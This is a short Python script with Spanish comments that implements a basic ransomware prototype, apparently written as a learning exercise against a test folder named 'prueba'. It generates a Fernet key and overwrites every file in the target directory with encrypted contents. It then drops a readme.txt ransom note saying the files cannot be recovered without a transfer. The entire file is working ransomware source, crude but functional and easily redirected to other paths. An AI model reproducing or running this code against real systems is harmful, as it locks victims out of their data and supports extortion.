from cryptography.fernet  import Fernet
import os

#Genera la clave de acceso y abre un archivo de escritura
def generar_key():
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)

#Carga nuestra clave del archivo previamente generado y lo lee
def cargar_key():
    return open('key.key','rb').read()

#Creamos nuestra función de encriptación
def encrypt(items,key):
    f = Fernet(key)
    
    #Bucle para interar por los diferentes elementos  
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb')as file:
            file.write(encrypted_data)
            
if __name__ ==  "__main__":
    #Ubicación del fichero
    path_to_encrypt = '..\\ransomware\\prueba'
    #Listamos cuantos ficheros contiene
    items = os.listdir(path_to_encrypt)
    #
    full_path = [path_to_encrypt + '\\'+ item for item in items]
    
    
    generar_key()
    key = cargar_key()
    
    #sirve para encriptar los diferentes elementos como nosotros queremos
    encrypt(full_path, key)
    
    #fichero README donde pediremmos un rescate
    with open(path_to_encrypt+'\\'+'readme.txt','w') as file:
        file.write('Fichero encriptado\n')
        file.write('Sin transferencia no podras recuperar tus archivos')
        
    


